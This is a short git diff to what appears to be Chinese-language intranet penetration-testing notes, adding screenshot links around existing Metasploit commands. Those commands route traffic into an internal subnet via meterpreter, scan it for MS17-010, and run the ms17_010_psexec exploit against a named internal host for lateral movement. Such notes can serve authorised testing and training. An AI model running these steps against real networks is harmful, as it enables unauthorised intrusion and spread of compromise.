@@ -548,6 +548,9 @@ wmic /node:“hostname” bios get serialnumber (this can be great for finding w
   meterpreter > run autoroute -s 192.168.52.0/24
   查看路由
   run autoroute -p
+  ```
+   ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B71.PNG)
+ ```  
   
   ms17010 扫描
   use auxiliary/scanner/smb/smb_ms17_010 
@@ -555,6 +558,9 @@ wmic /node:“hostname” bios get serialnumber (this can be great for finding w
   set rhosts 192.168.52.0/24
   set threads 20
   run
+  ```
+   ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B73.PNG)
+  ```
   
   
   使用exp横向渗透192.168.101.138的主机：
@@ -563,6 +569,9 @@ wmic /node:“hostname” bios get serialnumber (this can be great for finding w
   msf exploit(ms17_010_psexec) > set rhost 192.168.101.138
   msf exploit(ms17_010_psexec) > exploit
   
+  ```
+   ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B74.PNG)
+  ```
 4.
 
 ```    
